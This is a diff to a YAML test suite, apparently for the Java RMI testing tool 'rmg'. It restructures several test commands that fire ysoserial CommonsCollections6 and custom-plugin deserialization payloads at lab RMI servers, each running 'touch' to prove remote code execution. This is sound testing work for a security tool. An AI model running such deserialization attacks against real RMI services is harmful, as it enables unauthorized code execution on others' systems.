@@ -34,15 +34,17 @@ tests:
     groups:
       - ysoserial
 
-    command: '${BASE-CMD}'
-    arguments:
+    command:
+      - rmg
       - serial
+      - ${TARGET}
       - CommonsCollections6 
       - 'touch ${volume-d}/${file}'
       - --signature
       - 'String system(String dummy, String[] dummy2)'
       - --bound-name
       - plain-server
+      - ${OPTIONS}
 
     validators:
       - error: False
@@ -66,15 +68,17 @@ tests:
     groups:
       - ysoserial
 
-    command: '${BASE-CMD}'
-    arguments:
+    command:
+      - rmg
       - serial
+      - ${TARGET}
       - CommonsCollections6 
       - 'touch ${volume-d}/${file}'
       - --signature
       - 'void releaseRecord(int recordID, String tableName, Integer remoteHashCode)'
       - --bound-name
       - legacy-service
+      - ${OPTIONS}
 
     validators:
       - error: False
@@ -99,9 +103,10 @@ tests:
     groups:
       - payload-provider
 
-    command: '${BASE-CMD}'
-    arguments:
+    command:
+      - rmg
       - serial
+      - ${TARGET}
       - custom 
       - 'touch ${volume-d}/${file}'
       - --signature
@@ -110,6 +115,7 @@ tests:
       - legacy-service
       - --plugin
       - ../../utils/PluginTest.jar
+      - ${OPTIONS}
 
     validators:
       - error: False
@@ -133,15 +139,17 @@ tests:
     groups:
       - ysoserial
 
-    command: '${BASE-CMD}'
-    arguments:
+    command:
+      - rmg
       - serial
+      - ${TARGET}
       - CommonsCollections6 
       - 'touch ${volume-d}/${file}'
       - --signature
       - 'String execute(String dummy)'
       - --bound-name
       - plain-server
+      - ${OPTIONS}
 
     validators:
       - error: False
